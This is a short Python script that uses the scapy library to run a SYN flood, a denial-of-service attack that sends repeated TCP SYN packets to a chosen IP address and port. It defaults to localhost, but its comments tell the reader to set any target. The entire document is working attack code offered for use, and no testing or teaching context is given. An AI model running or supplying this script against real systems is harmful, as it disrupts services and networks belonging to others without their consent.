from scapy.all import *

# Define the target IP and port
target_ip = "127.0.0.1"  # Change this to your target IP
target_port = 80  # Change this to your target port (HTTP is 80)

# Create a SYN packet
def create_syn_packet(target_ip, target_port):
    return IP(dst=target_ip) / TCP(dport=target_port, flags="S")

# Send SYN packets in a loop
def syn_flood_attack(target_ip, target_port, num_packets=1000):
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    packet = create_syn_packet(target_ip, target_port)
    for _ in range(num_packets):
        send(packet, verbose=0)  # Send the packet without verbose output
    print(f"Sent {num_packets} SYN packets")

# Run the attack
if __name__ == "__main__":
    syn_flood_attack(target_ip, target_port)
